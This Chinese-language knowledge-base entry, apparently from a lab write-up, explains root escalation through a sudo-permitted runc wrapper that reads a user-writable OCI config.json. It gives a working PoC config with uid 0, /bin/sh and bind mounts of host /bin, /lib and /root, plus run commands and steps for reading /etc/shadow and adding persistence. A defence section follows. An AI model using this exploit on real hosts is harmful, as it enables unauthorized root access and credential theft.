---
id: cloud-container-sudo-runc-wrapper-oci-config-root
title: sudo 授权 runc 包装器 + 可控 OCI config.json：bind mount 宿主机 /root 启动 uid=0 shell
type: scenario
domain: cloud
path: cloud/container
technique: sudo-runc-wrapper-oci-config-root-shell
aliases:
- /opt/debug runc
- runc config.json 提权
- OCI bundle 提权
- sudo runc 容器逃逸
- runc bind mount /root
- runc 本地提权
tags:
- runc
- oci
- container-escape
- privilege-escalation
- sudo
- config-json
- bind-mount
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V198
  verified_at: '2026-11-06T22:43:10+08:00'
  notes: 已对照原文核对：sudo -l 授权 /opt/debug、config.json 的 uid/gid 0+/bin/sh+root.path shellss+bind /bin,/lib,/lib64,/root,/dev、仅 mount namespace、administrative password 来自 K8s Secret 解出的 MariaDB 密码、最终 uid=0 均与原文一致；runc 内部调用为作者判断，未给版本
---

## 一句话结论

当 sudo 允许低权限用户运行一个会调用 `runc` 的包装器（示例 `/opt/debug run <name>`），且该包装器读取当前目录下用户可写的 OCI `config.json` 时，攻击者可以把 `process.user.uid` 设为 0、`args` 设为 `/bin/sh`，并通过 bind mount 把宿主机 `/bin`、`/lib`、`/root` 挂进容器，`runc run` 就会在宿主机上启动一个 uid=0 的 shell，直接读取 `/root` 等宿主文件。

## 原理

- **sudo 授权的是包装器，不是 runc**：`/opt/debug` 是 root 所有的可执行文件，sudoers 允许 `babywyrm` 以 root 运行它（`(ALL) /opt/debug`）。它内部调用 `runc` 并按当前目录的 `config.json` 创建容器；sudo 使整个包装器（包括 runc）以 root 运行。
- **OCI config 完全由用户控制**：OCI bundle 的 `config.json` 定义 `process.user.uid/gid`、`args`、`root.path`、`mounts`、`linux.namespaces`。包装器没有校验 config 的来源/内容，攻击者在可写目录写入自己的 config 即可。
- **uid 0 没有 user namespace 映射**：示例 config 的 `linux.namespaces` 只有 `{"type":"mount"}`，没有 `user` namespace；因此 `process.user.uid=0` 直接对应宿主机 uid 0（runc 以 root 运行，容器进程也是 root）。
- **bind mount 宿主机目录**：config 把宿主机 `/bin`、`/lib`、`/lib64`、`/root`、`/dev` 以 bind 方式挂到容器内（`/root` 只读），容器内 `/bin/sh` 是宿主机二进制，`/root` 是宿主机 root 家目录；即使挂载只读，root 仍可读取 `/root`、`/etc/shadow` 等敏感文件（若挂载可写还能修改）。
- **root.path 只需存在**：`root.path` 指向攻击者创建的 `shellss` 目录；runc 以它为容器根，配合 bind mount 补齐 `/bin`、`/lib`，即可启动 shell。攻击者不需要完整 rootfs。
- **密码校验不等于安全边界**：包装器会提示输入 “administrative password”，但该密码可从同环境泄露的凭据中获得（示例为 K8s Secret 解出的 MariaDB 密码）；知道密码后即可执行任意 config。即使密码未知，也可尝试从环境/配置/历史中收集。
- **为什么不是普通 sudo 命令逃逸**：sudo 规则只允许 `/opt/debug`，但该程序把“容器配置”这一数据变成了 root 代码执行；本质是授权程序把用户可控的 OCI 配置交给特权运行时，属于配置注入/容器运行时滥用。

## 触发条件

- 低权限用户可通过 sudo 运行一个调用 `runc`（或 crun/youki 等 OCI 运行时）的包装器，且无需或只需已知密码。
- 包装器从当前目录/用户可写路径读取 `config.json`（或允许指定 bundle 路径）。
- 系统安装了 runc，且没有禁止普通用户通过 sudo 包装器创建容器。
- config 未使用 user namespace 映射（或映射允许 uid 0 落到宿主 root）。
- 攻击者能在某目录写入 `config.json` 与 `root.path` 目录；对宿主机 `/bin`、`/lib`、`/root` 有 bind mount 权限（root 运行 runc 即可）。

## 利用步骤

1. 枚举 sudo：`sudo -l`，确认可运行 `/opt/debug`（或类似 runc 包装器）及可用的参数。
2. 确认包装器行为：`ls -l /opt/debug`、`strings`/反汇编/试运行，判断它是否读取当前目录 `config.json`、是否调用 `runc`、密码校验逻辑。
3. 创建目录（示例 `shellss`）并写入恶意 `config.json`：uid/gid 0、`args=["/bin/sh"]`、`root.path=shellss`、bind mount 宿主机 `/bin`、`/lib`、`/lib64`、`/root`、`/dev`，仅 mount namespace。
4. 执行 `sudo /opt/debug run <name>`；按提示输入收集到的 administrative password。
5. 进入 shell 后 `id` 确认 uid=0，读取 `/root`、`/etc/shadow`、宿主机配置，或进一步写入持久化。
6. 授权测试只执行 `id`、`cat /etc/hostname` 等无害命令，结束后删除 config 与目录。

## PoC

恶意 OCI `config.json`（原文）：

```json
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": true
  },
  "root": {"path": "shellss"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind", "ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind", "ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind", "ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind", "ro"]},
    {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "ro"]},
    {"destination": "/dev/shm", "type": "tmpfs", "source": "tmpfs", "options": ["size=65536k", "mode=1777"]}
  ],
  "linux": {"namespaces": [{"type": "mount"}]}
}
```

执行：

```bash
mkdir -p shellss
# 写入上面的 config.json
sudo /opt/debug run nuii
# Please enter the administrative password: <泄露的宿主机密码>
# id
# uid=0 gid=0 groups=0
```

## 变体与关联

- 包装器参数不同：可能接受 bundle 路径、容器名、镜像名；观察它把哪个路径当 `config.json`，优先找用户可写目录。
- 若包装器固定读取 root 所有的 config，寻找其可写副本/符号链接/环境变量覆盖；或利用其日志/临时目录。
- 其他 OCI 运行时（crun、youki、podman）同样信任 config；只要 sudo 授权了可控 bundle，思路一致。
- 若启用 user namespace 且 uid 0 映射到非 0，需调整 `uidMappings` 或寻找其他 root 映射。
- 关联：[[cloud-container-runc-fd-leak-escape]]（runc 自身漏洞 CVE-2024-21626，机制不同）。
- 关联：[[pentest-privilege-escalation-sudo-allowed-program-gtfobins-escape]]（sudo 授权程序自带逃逸功能的通用思路）。

## 检测与防御

- 不要把 sudo 授权给容器运行时/包装器（`runc`、`docker`、`ctr`、`/opt/debug` 等）；这些程序天然可创建 root 容器。
- 包装器应使用固定的、root 所有的 config/bundle，且校验路径与文件所有权；不要从当前目录或用户可写路径读取 config。
- 启用 user namespace 映射，使容器内 uid 0 不直接等于宿主 root；限制 bind mount 宿主敏感目录。
- 使用 rootless 容器运行时；对 sudo 命令加 `NOEXEC`/`SETENV` 限制并审计参数。
- 监控 `sudo` 执行 `/opt/debug`/`runc run`、用户目录出现 `config.json`、容器 bind mount `/root`/`/etc` 等行为；审计 `sudo -l` 中的运行时类授权。
